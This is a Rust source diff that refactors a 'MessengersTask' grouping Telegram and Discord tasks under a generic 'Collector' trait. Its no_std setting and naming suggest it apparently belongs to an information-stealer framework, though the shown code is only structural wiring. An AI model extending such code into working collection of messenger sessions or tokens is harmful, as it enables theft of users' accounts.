@@ -1,23 +1,23 @@
 #![no_std]
 #![allow(unsafe_op_in_unsafe_fn)]
 
+extern crate alloc;
 use crate::alloc::borrow::ToOwned;
 mod telegram;
 mod discord;
 
-extern crate alloc;
-
-use alloc::vec;
-use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
 use crate::discord::DiscordTask;
 use crate::telegram::TelegramTask;
+use alloc::vec;
+use collector::Collector;
+use tasks::{composite_task, impl_composite_task_runner, CompositeTask, Task};
 
-pub struct MessengersTask {
-    inner: CompositeTask
+pub struct MessengersTask<C: Collector> {
+    inner: CompositeTask<C>
 }
 
-impl MessengersTask {
-    pub fn new() -> Self {
+impl<C: Collector> Default for MessengersTask<C> {
+    fn default() -> Self {
         Self {
             inner: composite_task!(
                 TelegramTask,
@@ -27,4 +27,4 @@ impl MessengersTask {
     }
 }
 
-impl_composite_task_runner!(MessengersTask, "Messengers");
+impl_composite_task_runner!(MessengersTask<C>, "Messengers");
